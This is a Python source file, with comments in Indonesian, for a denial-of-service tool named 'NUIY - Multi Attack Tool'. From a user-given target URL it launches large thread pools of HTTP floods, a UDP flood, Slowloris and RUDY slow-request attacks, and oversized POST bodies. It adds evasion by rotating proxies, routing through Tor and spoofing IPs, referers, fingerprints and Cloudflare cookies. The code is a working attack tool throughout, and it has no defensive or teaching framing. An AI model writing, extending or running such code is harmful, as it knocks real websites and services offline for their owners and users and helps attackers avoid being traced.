#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import time
import random
import string
import socket
import threading
import argparse
import signal
import urllib.parse
from collections import defaultdict

# Nonaktifkan peringatan SSL/TLS
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    import requests
except ImportError:
    print("Install requests: pip install requests")
    sys.exit(1)

# Cek pysocks untuk Tor
try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False

# ================ KONFIGURASI ================
VERSION = "1.0.0"
ACCEPT_CHARSET = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

# Global variabel
use_http2 = False
use_udp = False
use_slowloris = False
use_rudy = False
use_gzip_bomb = False
use_proxy = False
use_tor = False
use_cloudflare = False
use_fingerprint = False
use_referer = False
use_ratelimit = False
use_random_ip = False
use_pipeline = False
use_keep_alive = True
verbose = False
quiet = False

headers_referers = [
    "http://www.google.com/?q=",
    "http://www.usatoday.com/search/results?q=",
    "http://engadget.search.aol.com/search?q=",
    "https://www.facebook.com/search/top?q=",
    "https://www.twitter.com/search?q=",
    "https://www.instagram.com/explore/tags/",
    "https://www.youtube.com/results?search_query=",
    "https://www.reddit.com/search?q=",
]

headers_useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
]

# Statistik
stats = {
    'success': 0,
    'failed': 0,
    'total': 0,
    'status_codes': defaultdict(int),
    'lock': threading.Lock(),
    'start_time': time.time()
}

# Proxies
proxy_list = []
proxy_index = 0
proxy_lock = threading.Lock()

# Stop signal
stop_event = threading.Event()

# ================ FUNGSI BANTU ================
def build_random_string(size):
    charset = string.ascii_letters + string.digits
    return ''.join(random.choice(charset) for _ in range(size))

def get_random_user_agent():
    return random.choice(headers_useragents)

def get_random_referer():
    return random.choice(headers_referers)

def get_random_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def get_random_fingerprint():
    fingerprints = [
        '"Chromium";v="120", "Not=A?Brand";v="24"',
        '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        '"Opera";v="106", "Chromium";v="106", "Not?A_Brand";v="24"',
    ]
    return random.choice(fingerprints)

def get_random_platform():
    return random.choice(["Windows", "macOS", "Linux", "Android", "iOS"])

def build_query_params():
    params = []
    for _ in range(random.randint(10, 30)):
        key = build_random_string(random.randint(5, 15))
        value = build_random_string(random.randint(5, 15))
        params.append(f"{key}={value}")
    params.append(f"_t={int(time.time()*1000)}")
    params.append(f"_r={build_random_string(16)}")
    return "&".join(params)

def build_gzip_bomb(size_mb):
    return "A" * (size_mb * 1024 * 1024 // 100)

def load_proxies(filename):
    global proxy_list
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and ':' in line:
                    proxy_list.append(line)
        if not quiet:
            print(f" 🔑 Loaded {len(proxy_list)} proxies from {filename}")
    except Exception as e:
        if not quiet:
            print(f" ❌ Can't load proxy file: {e}")

def get_proxy():
    global proxy_index
    with proxy_lock:
        if not proxy_list:
            return None
        proxy = proxy_list[proxy_index]
        proxy_index = (proxy_index + 1) % len(proxy_list)
        return proxy

def format_duration(seconds):
    if seconds < 60:
        return f"{seconds}s"
    mins = seconds // 60
    secs = seconds % 60
    return f"{mins}m{secs:02d}s"

# ================ SERANGAN ================
def udp_flood(host):
    parts = host.split(':')
    if len(parts) < 2:
        host = host + ":80"
        parts = host.split(':')
    ip = parts[0]
    port = int(parts[1]) if len(parts) > 1 else 80

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = bytes([random.randint(0,255) for _ in range(1024*64)])

    while not stop_event.is_set():
        try:
            sock.sendto(payload, (ip, port))
            time.sleep(0.0001)
        except:
            pass
    sock.close()

def slowloris_attack(host):
    if ':' not in host:
        host = host + ":80"
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            host_parts = host.split(':')
            s.connect((host_parts[0], int(host_parts[1])))
            s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {get_random_user_agent()}\r\nAccept: */*\r\n".encode())
            while not stop_event.is_set():
                s.send(f"X-Header-{random.randint(1,9999)}: {build_random_string(random.randint(10,30))}\r\n".encode())
                time.sleep(random.uniform(5,15))
        except:
            continue
        finally:
            try:
                s.close()
            except:
                pass

def worker(target_url, host, data, headers, payload_size):
    global use_tor

    session = requests.Session()
    session.verify = False

    # Proxy setup
    proxy_http = None
    proxy_https = None

    if use_tor:
        if SOCKS_AVAILABLE:
            proxy_http = 'socks5://127.0.0.1:9050'
            proxy_https = 'socks5://127.0.0.1:9050'
        else:
            if verbose and not quiet:
                print(" [!] pysocks not installed. Tor disabled.")
            use_tor = False
    elif use_proxy and proxy_list:
        proxy_addr = get_proxy()
        if proxy_addr:
            proxy_http = f'http://{proxy_addr}'
            proxy_https = f'http://{proxy_addr}'

    if proxy_http or proxy_https:
        session.proxies = {}
        if proxy_http:
            session.proxies['http'] = proxy_http
        if proxy_https:
            session.proxies['https'] = proxy_https

    if not use_keep_alive:
        session.headers['Connection'] = 'close'

    param_joiner = '&' if '?' in target_url else '?'

    while not stop_event.is_set():
        try:
            # Buat request
            if use_rudy and random.random() < 0.33:
                payload = "A" * (payload_size * 1024 * 1024 // 2)
                req = requests.Request('POST', target_url, data=payload)
                req.headers['Content-Length'] = str(len(payload))
                req.headers['Content-Type'] = 'application/x-www-form-urlencoded'
            elif data:
                if use_gzip_bomb and random.random() < 0.5:
                    gzip_payload = build_gzip_bomb(payload_size)
                    req = requests.Request('POST', target_url, data=gzip_payload)
                    req.headers['Content-Encoding'] = 'gzip'
                    req.headers['Content-Type'] = 'application/gzip'
                else:
                    req = requests.Request('POST', target_url, data=data)
                    req.headers['Content-Type'] = 'application/x-www-form-urlencoded'
            else:
                query = build_query_params()
                req = requests.Request('GET', target_url + param_joiner + query)

            # Headers dasar
            req.headers['User-Agent'] = get_random_user_agent()
            req.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
            req.headers['Accept-Charset'] = ACCEPT_CHARSET
            req.headers['Accept-Encoding'] = 'gzip, deflate, br'
            req.headers['Host'] = host

            if use_referer:
                req.headers['Referer'] = get_random_referer() + build_random_string(random.randint(5,15))
            if use_random_ip:
                req.headers['X-Forwarded-For'] = get_random_ip()
                req.headers['X-Real-IP'] = get_random_ip()
            if use_fingerprint:
                req.headers['Sec-CH-UA'] = get_random_fingerprint()
                req.headers['Sec-CH-UA-Mobile'] = '?0'
                req.headers['Sec-CH-UA-Platform'] = get_random_platform()
                req.headers['Sec-Fetch-Dest'] = 'document'
                req.headers['Sec-Fetch-Mode'] = 'navigate'
                req.headers['Sec-Fetch-Site'] = 'none'
                req.headers['Sec-Fetch-User'] = '?1'
                req.headers['Upgrade-Insecure-Requests'] = '1'
            if use_cloudflare:
                req.headers['Cookie'] = f"__cfduid={build_random_string(random.randint(10,30))}"

            for h in headers:
                if ':' in h:
                    key, val = h.split(':', 1)
                    req.headers[key.strip()] = val.strip()

            if use_ratelimit:
                time.sleep(random.uniform(0,0.1))

            prep = session.prepare_request(req)
            start = time.time()
            try:
                resp = session.send(prep, timeout=30)
            except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError) as e:
                if verbose and not quiet:
                    print(f"  ⚠️ Proxy error, retrying without proxy")
                session.proxies = {}
                resp = session.send(prep, timeout=30)
            except requests.exceptions.Timeout:
                with stats['lock']:
                    stats['failed'] += 1
                continue

            latency = int((time.time() - start)*1000)

            with stats['lock']:
                stats['total'] += 1
                stats['status_codes'][resp.status_code] += 1
                if resp.status_code < 500:
                    stats['success'] += 1
                    if verbose and not quiet:
                        print(f"  ✅ {resp.status_code} - {latency}ms")
                else:
                    stats['failed'] += 1
                    if verbose and not quiet:
                        print(f"  ❌ {resp.status_code} - {latency}ms")

            if use_slowloris and random.random() < 0.2:
                time.sleep(random.uniform(1,5))

            if use_ratelimit:
                time.sleep(random.uniform(0,0.05))

        except Exception as e:
            with stats['lock']:
                stats['failed'] += 1
            if verbose and not quiet:
                print(f"  ❌ Error: {e}")

# ================ STATS PRINTER (compact) ================
def stats_printer(duration):
    while not stop_event.is_set():
        time.sleep(0.5)
        with stats['lock']:
            success = stats['success']
            failed = stats['failed']
            total = stats['total']
        elapsed = time.time() - stats['start_time']
        rate = total / elapsed if elapsed > 0 else 0
        progress = min(100, (elapsed / duration) * 100)
        remaining = max(0, duration - elapsed)
        remaining_str = format_duration(int(remaining))

        sys.stdout.write(f"\r ⏳{progress:5.1f}% ✅ {success} ❌ {failed} 📊 {total} 🚀 {rate:5.1f}/s ⏰ {remaining_str}")
        sys.stdout.flush()

# ================ BANNER ================
def print_banner():
    banner = """
    ════════════════════════════════════════════════════════
            ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓██████▓▒░  
            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░  ░▒▓█▓▒░     
            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░  ░▒▓█▓▒░     
            ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
    ════════════════════════════════════════════════════════
    ════════════════════════════════════════════════════════
    """
    print(banner)

# ================ ARGUMEN ================
def parse_args():
    global use_http2, use_udp, use_slowloris, use_rudy, use_gzip_bomb, use_proxy, use_tor
    global use_cloudflare, use_fingerprint, use_referer, use_ratelimit, use_random_ip
    global use_pipeline, use_keep_alive, verbose, headers_referers, headers_useragents
    global quiet

    parser = argparse.ArgumentParser(description='NUIY - Multi Attack Tool')
    parser.add_argument('-t', '--target', required=True, help='Target URL')
    parser.add_argument('-c', '--threads', type=int, default=1000, help='Number of threads (default: 1000)')
    parser.add_argument('-d', '--duration', type=int, default=600, help='Duration in seconds (default: 600)')
    parser.add_argument('-p', '--payload-size', type=int, default=5, help='Payload size in MB (default: 5)')
    parser.add_argument('--agents', help='File with user-agent list')
    parser.add_argument('--data', help='Data to POST')
    parser.add_argument('--header', action='append', help='Custom header (key:value)')

    parser.add_argument('--http2', action='store_true', help='Enable HTTP/2 Rapid Reset (not fully implemented)')
    parser.add_argument('--udp', action='store_true', help='Enable UDP flood')
    parser.add_argument('--slowloris', action='store_true', help='Enable Slowloris')
    parser.add_argument('--rudy', action='store_true', help='Enable RUDY')
    parser.add_argument('--gzip-bomb', action='store_true', help='Enable Gzip Bomb')
    parser.add_argument('--proxy', action='store_true', help='Enable proxy rotation')
    parser.add_argument('--proxy-file', help='Proxy file (ip:port per line)')
    parser.add_argument('--tor', action='store_true', help='Route through Tor (requires pysocks)')
    parser.add_argument('--cloudflare', action='store_true', help='Enable Cloudflare bypass')
    parser.add_argument('--fingerprint', action='store_true', help='Enable fingerprint spoofing')
    parser.add_argument('--referer', action='store_true', help='Enable referer spoofing')
    parser.add_argument('--ratelimit', action='store_true', help='Enable rate limit bypass')
    parser.add_argument('--random-ip', action='store_true', help='Use random X-Forwarded-For IPs')
    parser.add_argument('--pipeline', action='store_true', help='Enable HTTP pipelining (not implemented)')
    parser.add_argument('--keep-alive', action='store_true', default=True, help='Keep-alive connections')
    parser.add_argument('--all', action='store_true', help='Enable ALL features')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output (show each request)')
    parser.add_argument('--quiet', action='store_true', help='Suppress non-essential output (banner & features still shown)')
    parser.add_argument('--version', action='store_true', help='Show version')

    args = parser.parse_args()

    if args.version:
        print(f"NUIY {VERSION}")
        sys.exit(0)

    if args.all:
        args.http2 = args.udp = args.slowloris = args.rudy = args.gzip_bomb = True
        args.proxy = args.tor = args.cloudflare = args.fingerprint = True
        args.referer = args.ratelimit = args.random_ip = args.pipeline = True

    use_http2 = args.http2
    use_udp = args.udp
    use_slowloris = args.slowloris
    use_rudy = args.rudy
    use_gzip_bomb = args.gzip_bomb
    use_proxy = args.proxy
    use_tor = args.tor
    use_cloudflare = args.cloudflare
    use_fingerprint = args.fingerprint
    use_referer = args.referer
    use_ratelimit = args.ratelimit
    use_random_ip = args.random_ip
    use_pipeline = args.pipeline
    use_keep_alive = args.keep_alive
    verbose = args.verbose
    quiet = args.quiet

    # Jika quiet, verbose di-override
    if quiet:
        verbose = False

    # Load user agents
    if args.agents:
        try:
            with open(args.agents, 'r') as f:
                new_agents = [line.strip() for line in f if line.strip()]
                if new_agents:
                    headers_useragents = new_agents
                    if not quiet:
                        print(f" 📗 Loaded {len(headers_useragents)} user agents from {args.agents}")
        except Exception as e:
            if not quiet:
                print(f" 📕 Can't load User-Agent list: {e}")
            sys.exit(1)

    # Load proxies
    if use_proxy and args.proxy_file:
        load_proxies(args.proxy_file)

    # Generate referers
    if use_referer:
        domains = ["google.com", "facebook.com", "youtube.com", "twitter.com", "instagram.com",
                   "linkedin.com", "reddit.com", "wikipedia.org", "amazon.com", "netflix.com",
                   "github.com", "stackoverflow.com", "quora.com", "medium.com", "blogger.com",
                   "wordpress.com", "tumblr.com", "pinterest.com", "yandex.ru", "bing.com"]
        for domain in domains:
            for protocol in ["http", "https"]:
                headers_referers.append(f"{protocol}://{domain}/search?q=")
                headers_referers.append(f"{protocol}://{domain}/?q=")

    # Check Tor
    if use_tor and not SOCKS_AVAILABLE:
        if not quiet:
            print(" ⚠️ pysocks not installed. Tor will be disabled.")
        use_tor = False

    return args

# ================ SIGNAL HANDLER ================
def signal_handler(sig, frame):
    if not quiet:
        print("\n 📍 Stopped by user")
    stop_event.set()

# ================ MAIN ================
def main():
    args = parse_args()

    # Tampilkan banner dan informasi fitur SELALU (tidak dipengaruhi quiet)
    print_banner()
    print(f" 🎯 Target: {args.target}")
    print(f" 💣 Threads: {args.threads}")
    print(f" ⏰ Duration: {args.duration}s")
    print(f" 📦 Payload: {args.payload_size}MB")
    print(f" 💿 Compact mode: ON")
    print(f" 💎  Features:")
    print(f"   ├─ HTTP/2 Rapid Reset: {use_http2}")
    print(f"   ├─ UDP Flood: {use_udp}")
    print(f"   ├─ Slowloris: {use_slowloris}")
    print(f"   ├─ RUDY Attack: {use_rudy}")
    print(f"   ├─ Gzip Bomb: {use_gzip_bomb}")
    print(f"   ├─ Proxy Rotation: {use_proxy}")
    print(f"   ├─ Tor: {use_tor}")
    print(f"   ├─ Cloudflare Bypass: {use_cloudflare}")
    print(f"   ├─ Fingerprint Spoof: {use_fingerprint}")
    print(f"   ├─ Referer Spoof: {use_referer}")
    print(f"   ├─ Rate Limit Bypass: {use_ratelimit}")
    print(f"   ├─ Random IP: {use_random_ip}")
    print(f"   └─ HTTP Pipelining: {use_pipeline}")

    print("\n 🔥 SENDING THREAD 🚀🚀🚀......\n")

    # Start worker threads
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(
            args.target,
            urllib.parse.urlparse(args.target).netloc,
            args.data or '',
            args.header or [],
            args.payload_size
        ))
        t.daemon = True
        t.start()
        threads.append(t)

    # UDP flood
    if use_udp:
        host = urllib.parse.urlparse(args.target).netloc
        t_udp = threading.Thread(target=udp_flood, args=(host,))
        t_udp.daemon = True
        t_udp.start()

    # Slowloris
    if use_slowloris:
        host = urllib.parse.urlparse(args.target).netloc
        t_slow = threading.Thread(target=slowloris_attack, args=(host,))
        t_slow.daemon = True
        t_slow.start()

    # Stats printer
    stats['start_time'] = time.time()
    t_stats = threading.Thread(target=stats_printer, args=(args.duration,))
    t_stats.daemon = True
    t_stats.start()

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    try:
        time.sleep(args.duration)
        if not quiet:
            print("\n  ⏰ Duration completed")
    except KeyboardInterrupt:
        pass

    stop_event.set()
    time.sleep(1)

    # Final stats
    elapsed = time.time() - stats['start_time']
    with stats['lock']:
        success = stats['success']
        failed = stats['failed']
        total = stats['total']
        status_codes = stats['status_codes']

    print("\n\n 🎯 ATTACK FINISHED")
    print(f" 📗 Success: {success}")
    print(f" 📕 Failed: {failed}")
    print(f" 📘Request: {total}")
    print(" 📊 Status Codes:")
    for code, count in status_codes.items():
        print(f"   ├─ {code}: {count}")
    rate = total / elapsed if elapsed > 0 else 0
    print(f" ⏱️ Duration: {elapsed:.2f} seconds")
    print(f" 📊 Average Rate: {rate:.2f} req/s")
    print("\n  🚀🚀🚀 done.....")

if __name__ == "__main__":
    main()
